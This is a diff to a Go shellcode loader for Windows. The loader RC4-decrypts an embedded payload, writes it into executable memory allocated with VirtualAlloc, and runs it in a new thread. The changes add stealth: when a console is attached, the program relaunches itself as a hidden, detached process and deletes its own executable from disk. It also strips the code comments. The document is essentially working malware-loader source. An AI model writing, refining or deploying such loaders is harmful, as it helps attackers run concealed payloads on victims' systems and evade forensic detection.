@@ -8,7 +8,10 @@ import (
 	_ "embed"
 	"errors"
 	"fmt"
+	"os"
+	"os/exec"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -22,27 +25,22 @@ var encryptedShellcode []byte
 //go:embed key.txt
 var rc4Key []byte
 
-// ==============================
-// Windows API
-// ==============================
-
 var (
 	kernel32                = syscall.NewLazyDLL("kernel32.dll")
 	procVirtualAlloc        = kernel32.NewProc("VirtualAlloc")
 	procCreateThread        = kernel32.NewProc("CreateThread")
 	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
+	procGetConsoleWindow    = kernel32.NewProc("GetConsoleWindow")
 )
 
 const (
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	PAGE_EXECUTE_READWRITE = 0x40
-	INFINITE               = 0xFFFFFFFF
+	MEM_COMMIT               = 0x1000
+	MEM_RESERVE              = 0x2000
+	PAGE_EXECUTE_READWRITE   = 0x40
+	INFINITE                 = 0xFFFFFFFF
+	CREATE_NEW_PROCESS_GROUP = 0x00000200
+	DETACHED_PROCESS         = 0x00000008
 )
-
-// ==============================
-// Decrypt embedded shellcode
-// ==============================
 
 func Decrypt() ([]byte, error) {
 	c, err := rc4.NewCipher(rc4Key)
@@ -57,16 +55,31 @@ func Decrypt() ([]byte, error) {
 	return dec, nil
 }
 
-// ==============================
-// Execute shellcode inline
-// ==============================
-
 func Execute(sc []byte) error {
+	if attachedToConsole() {
+		// Relaunch as detached, no flags!
+		exe, _ := os.Executable()
+		cmd := exec.Command(exe)
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			CreationFlags: CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS,
+			HideWindow:    true,
+		}
+		err := cmd.Start()
+		if err != nil {
+			return fmt.Errorf("detach failed: %w", err)
+		}
+		// Optionally self-delete (delete .exe from disk after spawn)
+		go func() {
+			time.Sleep(2 * time.Second)
+			os.Remove(exe)
+		}()
+		os.Exit(0)
+	}
+
+	// Detached: run as usual (no console, no flag!)
 	if len(sc) == 0 {
 		return errors.New("no shellcode to execute")
 	}
-
-	// Allocate RWX memory
 	addr, _, _ := procVirtualAlloc.Call(
 		0,
 		uintptr(len(sc)),
@@ -76,12 +89,9 @@ func Execute(sc []byte) error {
 	if addr == 0 {
 		return errors.New("VirtualAlloc failed")
 	}
-
-	// Copy shellcode into allocated memory
 	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))
 	copy(dst[:len(sc):len(sc)], sc)
 
-	// Create thread at shellcode start
 	hThread, _, _ := procCreateThread.Call(
 		0,
 		0,
@@ -93,8 +103,12 @@ func Execute(sc []byte) error {
 	if hThread == 0 {
 		return errors.New("CreateThread failed")
 	}
-
-	// Wait until thread finishes
 	procWaitForSingleObject.Call(hThread, INFINITE)
 	return nil
+}
+
+// Check if process is attached to a console (parent shell/terminal)
+func attachedToConsole() bool {
+	hwnd, _, _ := procGetConsoleWindow.Call()
+	return hwnd != 0
 }
